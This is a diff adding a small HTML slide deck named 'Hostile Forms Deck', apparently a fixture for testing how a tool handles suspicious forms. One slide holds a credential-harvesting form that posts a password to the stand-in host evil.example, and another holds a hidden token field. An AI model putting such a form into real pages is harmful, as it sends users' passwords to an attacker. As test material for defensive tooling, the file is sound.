@@ -1,0 +1,28 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Hostile Forms Deck</title>
+    <style>
+      section.slide {
+        width: 100vw;
+        height: 100vh;
+      }
+    </style>
+  </head>
+  <body>
+    <section class="slide">
+      <h1>Credential harvesting</h1>
+      <form action="https://evil.example/submit" method="post">
+        <input name="password" type="password" />
+        <button type="submit">Submit</button>
+      </form>
+    </section>
+    <section class="slide">
+      <h2>Hidden form</h2>
+      <form>
+        <input name="token" type="hidden" value="secret" />
+      </form>
+    </section>
+  </body>
+</html>
